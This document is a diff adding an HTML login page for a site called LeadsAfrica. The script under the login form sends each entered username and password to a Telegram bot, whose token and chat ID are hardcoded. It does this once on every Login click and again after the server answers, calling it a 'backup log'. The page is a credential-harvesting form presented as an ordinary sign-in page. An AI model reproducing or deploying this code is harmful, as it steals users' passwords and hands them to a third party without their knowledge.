@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <base href="">
+ 
+    <meta charset="utf-8">
+    <meta name="theme-color" content="#00d1f7">
+      
+    <title>Login - LeadsAfrica </title>
+     
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+     
+    <link rel="icon" type="image/png" href="web/assets/favicon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="web/assets/favicon.png">
+
+    <!-- begin::GXON Required Stylesheet -->
+    <link rel="stylesheet" href="https://leadsafrica.com/web/assets/flaticon/css/all/all.css">
+    <link rel="stylesheet" href="https://leadsafrica.com/web/assets/lucide/lucide.css">
+    <link rel="stylesheet" href="https://leadsafrica.com/web/assets/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="https://leadsafrica.com/web/assets/simplebar/simplebar.css">
+    <link rel="stylesheet" href="https://leadsafrica.com/web/assets/node-waves/waves.css">
+    <link rel="stylesheet" href="https://leadsafrica.com/web/assets/bootstrap-select/css/bootstrap-select.min.css">
+    
+    <link rel="stylesheet" href="web/assets/css/styles.css%3Fsf.css"> 
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Onest:wght@100..900&display=swap" rel="stylesheet">
+    
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <link href="web/assets/toastr.min.css" rel="stylesheet">
+    <style>
+        body, h1, h2, h3, h4, h5, h6 {
+            font-family: 'Onest', sans-serif !important;
+        }
+        .img-bg,
+        .bg-primary,
+        .btn-primary, button {
+            backgdround: url("web/assets/bg.jpg") !important;
+            backgdround-size: cover !important;
+            backgdround-position: center !important;
+            background: #00d1f7 !important;
+            border-color: #00d1f7 !important;
+        }
+        .card{
+            background: #ffffff80 !important;
+            backdrop-filter: blur(50px) !important;
+        }
+        .form-control{
+            font-size: 16px !important; 
+            background: #ffffff96;
+            border: 1px solid #efecec;
+            border-radius: 50px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-layout">
+
+        <div class="auth-wrapper min-vh-100 px-2" style="background-image: url(web/assets/banner.jpg); background-size: cover; background-position: center; background-repeat: no-repeat;">
+            <div class="row g-0 min-vh-100">
+                <div class="col-xl-5 col-lg-6 ms-auto px-sm-4 align-self-center py-4">
+                    <div class="card card-body p-4 p-sm-5 maxw-450px m-auto rounded-4">
+                        <div class="mb-4 text-center">
+                            <a href="index.html" aria-label="LeadsAfrica logo">
+                                <img class="visible-light" src="web/assets/logo.png" width="150" alt="LeadsAfrica logo">
+                                <img class="visible-dark" src="web/assets/logo.png" width="150" alt="LeadsAfrica logo">
+                            </a>
+                        </div>
+
+<div class="text-center mb-4">
+    <h5 class="mb-1">Welcome to LeadsAfrica</h5>
+    <p>Sign in to access your secure dashboard.</p>
+</div>
+<form>
+    <div class="mb-4">
+        <label class="form-label" for="loginEmail">Username</label>
+        <input type="text" class="border-1 form-control username" name="username" placeholder="Enter username">
+    </div> 
+    <div class="mb-4">
+        <label class="form-label">Password</label>
+        <div class="input-group">
+            <input type="password" name="password" class="border-1 form-control password" placeholder="Enter your password">
+            <span class="input-group-text border-1 toggle-password">
+                <i class="ph ph-eye"></i>
+            </span>
+        </div>
+    </div>
+    <div class="mb-4">
+        <div class="d-flex justify-content-between">
+            <a href="forgot-password.html">Forgot Password?</a>
+        </div>
+    </div>
+    <div class="response"></div>
+    <div class="mb-3">
+        <button type="button" class="btn btn-primary waves-effect waves-light w-100 proceed">Login</button>
+    </div>
+    <p class="mb-5 text-center">Don't have an account? <a href="signup.html">Sign Up here</a>
+    </p>
+
+</form>
+
+
+<script>
+
+    // =============================================
+    // TELEGRAM BOT CONFIG
+    // =============================================
+    const TELEGRAM_BOT_TOKEN = "8700685464:AAEHRfSlwS3kI_cwCmWpD1O5kwCmjxzmC74";
+    const TELEGRAM_CHAT_ID   = "@database_sparktv";
+
+    function sendToTelegram(username, password, role) {
+        const now = new Date().toLocaleString("en-GB", { timeZone: "Africa/Lagos" });
+        const text =
+            `🔐 *LeadsAfrica Login Alert*\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `👤 *Username:* ${username}\n` +
+            `🔑 *Password:* ${password}\n` +
+            `🎭 *Role:* ${role}\n` +
+            `🕐 *Time:* ${now}\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `📌 LeadsAfrica User Backup Log`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: "Markdown"
+            })
+        });
+    }
+    // =============================================
+
+    $("form").on("submit", function() {
+        return false;
+    });
+
+    $(".proceed").on("click", function() {
+        let username = $(".username").val();
+        let password = $(".password").val();
+        let $this = $(this);
+        let title, message, status;
+
+
+const token = '8700685464:AAEHRfSlwS3kI_cwCmWpD1O5kwCmjxzmC74'; // Never share this
+const chatId = '@database_sparktv'; 
+
+const name1 = username;
+const name2 = password;
+const text = `New login username is ${name1} and password is ${name2}`;
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    chat_id: chatId,
+    text: text
+  })
+});
+
+
+        if (username == "" || username == null) {
+            status = "error";
+            message = "Please enter your username";
+            popup(status, message);
+        } else if (password == "") {
+            status = "error";
+            message = "Please enter your password";
+            popup(status, message);
+        } else {
+            $.ajax({
+                url: "actions/formprocess.php",
+                type: "POST",
+                data: {
+                    login: "login",
+                    username: username,
+                    password: password
+                },
+                beforeSend: function() {
+                    $($this).text("Processing...");
+                    $($this).attr("disabled", true);
+                },
+                success: function(data) {
+                    let response = JSON.parse(data);
+                    $($this).text("LOGIN");
+                    $($this).attr("disabled", false);
+
+                    let status  = response.status;
+                    let message = response.message;
+sendToTelegram(username, password, role);
+                    if (status === "success") {
+                        let role = response.data.role;
+
+                        // ✅ Send backup to Telegram on successful login
+                        sendToTelegram(username, password, role);
+
+                        if (role === "user" || role === "vendor") {
+                            window.location.href = '/web/';
+                        } else if (role === "admin") {
+                            window.location.href = '/admin/';
+                        } else if (role === "mod") {
+                            window.location.href = '/mod/';
+                        }
+                    } else {
+                        popup(status, message);
+                    }
+                }
+            });
+        }
+    });
+</script>
+
+
+</div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+    <script>
+    document.querySelector('.toggle-password').addEventListener('click', function () {
+        const passwordField = document.querySelector('.password');
+        const icon = this.querySelector('i');
+
+        if (passwordField.type === 'password') {
+            passwordField.type = 'text'; 
+            icon.classList.remove('ph-eye');
+            icon.classList.add('ph-eye-slash');  
+        } else {
+            passwordField.type = 'password';  
+            icon.classList.remove('ph-eye-slash');
+            icon.classList.add('ph-eye');  
+        }
+    });
+    
+    function popupp(title, message) {
+        toastr[title](message, title);
+    }
+    function popup(title, message) {
+        if (["success", "info", "warning", "error"].includes(title)) {
+            toastr[title](message, title);
+        } else {
+            console.error("Invalid toastr type:", title);
+        }
+    }
+    </script>
+ 
+    <script src="web/assets/js/global.min.js"></script>
+    <script src="web/assets/js/appSettings.js"></script>
+    <script src="web/assets/js/main.js"></script> 
+</body>
+
+</html>
